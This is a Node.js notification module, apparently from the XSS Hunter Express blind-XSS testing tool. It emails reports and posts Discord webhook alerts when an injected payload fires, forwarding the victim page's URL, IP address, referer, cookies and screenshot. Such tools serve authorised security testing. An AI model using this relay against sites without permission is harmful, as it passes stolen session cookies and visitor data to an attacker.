const nodemailer = require('nodemailer');
const mustache = require('mustache');
const fs = require('fs');
const path = require('path');
const https = require('https');
const url = require('url');

const XSS_PAYLOAD_FIRE_EMAIL_TEMPLATE = fs.readFileSync(
	path.join(__dirname, '../../templates/xss_email_template.htm'),
	'utf8'
);

async function send_email_notification(xss_payload_fire_data) {
	const transporter = nodemailer.createTransport({
		host: process.env.SMTP_HOST,
		port: parseInt(process.env.SMTP_PORT),
		secure: (process.env.SMTP_USE_TLS === "true"),
		auth: {
			user: process.env.SMTP_USERNAME,
			pass: process.env.SMTP_PASSWORD,
		},
	});

	const notification_html_email_body = mustache.render(
		XSS_PAYLOAD_FIRE_EMAIL_TEMPLATE, 
		xss_payload_fire_data
	);

	const info = await transporter.sendMail({
		from: process.env.SMTP_FROM_EMAIL,
		to: process.env.SMTP_RECEIVER_EMAIL,
		subject: `[XSS Hunter Express] XSS Payload Fired On ${xss_payload_fire_data.url}`,
		text: "Only HTML reports are available, please use an email client which supports this.",
		html: notification_html_email_body,
	});

	console.log("Message sent: %s", info.messageId);
}

async function send_discord_notification(xss_payload_fire_data) {
	return new Promise((resolve, reject) => {
		const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
		if (!webhookUrl) {
			reject(new Error('Discord webhook URL not configured'));
			return;
		}

		const parsedUrl = url.parse(webhookUrl);
		
		// Truncate cookies if too long
		let cookiesValue = xss_payload_fire_data.cookies || 'None';
		if (cookiesValue.length > 1024) {
			cookiesValue = cookiesValue.substring(0, 1021) + '...';
		}
		
		// Create Discord embed with essential data only
		const discordPayload = {
			embeds: [{
				title: '🎯 XSS Payload Fired!',
				description: `[📋 Open Admin Panel](https://${process.env.HOSTNAME}/admin)`,
				color: 15158332, // Red color
				fields: [
					{
						name: '🌐 URL',
						value: xss_payload_fire_data.url || 'N/A',
						inline: false
					},
					{
						name: '📍 IP Address',
						value: xss_payload_fire_data.ip_address || 'N/A',
						inline: true
					},
					{
						name: '🔗 Referer',
						value: xss_payload_fire_data.referer || 'None',
						inline: true
					},
					{
						name: '🍪 Cookies',
						value: cookiesValue,
						inline: false
					},
					{
						name: '🔑 Injection Key',
						value: `\`${xss_payload_fire_data.injection_key || 'N/A'}\``,
						inline: true
					}
				],
				timestamp: new Date().toISOString(),
				footer: {
					text: 'XSS Hunter Express'
				}
			}]
		};

		// Add screenshot URL if available (Discord will display it as an image)
		if (xss_payload_fire_data.screenshot_url) {
			discordPayload.embeds[0].image = {
				url: xss_payload_fire_data.screenshot_url
			};
		}

		const data = JSON.stringify(discordPayload);

		const options = {
			hostname: parsedUrl.hostname,
			path: parsedUrl.path,
			method: 'POST',
			headers: {
				'Content-Type': 'application/json',
				'Content-Length': Buffer.byteLength(data)
			}
		};

		const req = https.request(options, (res) => {
			let responseData = '';
			res.on('data', (chunk) => {
				responseData += chunk;
			});
			res.on('end', () => {
				if (res.statusCode === 204 || res.statusCode === 200) {
					console.log('Discord notification sent successfully');
					resolve();
				} else {
					console.error('Discord webhook error:', res.statusCode, responseData);
					reject(new Error(`Discord webhook returned status ${res.statusCode}`));
				}
			});
		});

		req.on('error', (error) => {
			console.error('Discord notification error:', error);
			reject(error);
		});

		req.write(data);
		req.end();
	});
}

module.exports.send_email_notification = send_email_notification;
module.exports.send_discord_notification = send_discord_notification;